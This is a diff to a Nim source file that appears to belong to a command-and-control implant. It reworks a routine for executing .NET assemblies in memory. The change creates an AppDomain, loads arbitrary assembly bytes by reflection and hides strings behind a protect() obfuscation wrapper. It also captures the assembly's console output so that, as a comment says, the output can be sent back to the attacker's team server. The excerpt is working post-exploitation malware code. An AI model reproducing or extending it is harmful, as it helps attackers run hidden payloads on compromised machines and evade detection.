@@ -56,26 +56,39 @@ proc dotnetInlineExecuteGetOutput*(assemblyBytes: seq[byte], arguments: seq[stri
 
     # For the actual assembly execution, the winim/[clr] library takes care of most of the heavy lifting for us here
     # - https://github.com/khchen/winim/blob/master/winim/clr.nim
-    var assembly = load(assemblyBytes)
+    var mscorlib = load(protect("mscorlib"))
+
+    # Create AppDomain
+    let appDomainType = mscorlib.GetType(protect("System.AppDomain"))
+    let domainSetup = mscorlib.new(protect("System.AppDomainSetup"))
+    domainSetup.ApplicationBase = getCurrentDir() 
+    domainSetup.DisallowBindingRedirects = false
+    domainSetup.DisallowCodeDownload = true
+    domainSetup.ShadowCopyFiles = protect("false")
+    
+    let domain = @appDomainType.CreateDomain(protect("AppDomain"), toCLRVariant(nil), domainSetup)
+    
+    # Load assembly     
+    let assemblyType = mscorlib.GetType("System.Reflection.Assembly")
+    let assembly = @assemblyType.Load(assemblyBytes.toCLRVariant(VT_UI1))
 
     # Parsing the arguments to be passed to the assembly 
     var args = arguments.toCLRVariant(VT_BSTR)
     
     # Redirect the output of the assembly to a .NET StringWriter so we can return it to the team server over the network
     var 
-        mscor = load(protect("mscorlib"))
-        io = load(protect("System.IO"))
-        Console = mscor.GetType(protect("System.Console"))
-        StringWriter = io.GetType(protect("System.IO.StringWriter")) 
+        Console = mscorlib.GetType(protect("System.Console"))
+        StringWriter = mscorlib.GetType(protect("System.IO.StringWriter")) 
 
     var stringWriter = @StringWriter.new() 
     var oldConsole = @Console.Out
     @Console.SetOut(stringWriter)
 
-    # Execute the assemblies entry point
+    # Execute the entry point of the assembly
     assembly.EntryPoint.Invoke(nil, toCLRVariant([args]))
 
-    # Reset console properties
+    # Cleanup
     @Console.SetOut(oldConsole)
+    @appDomainType.Unload(domain)
 
     return (assembly, fromCLRVariant[string](stringWriter.ToString()))
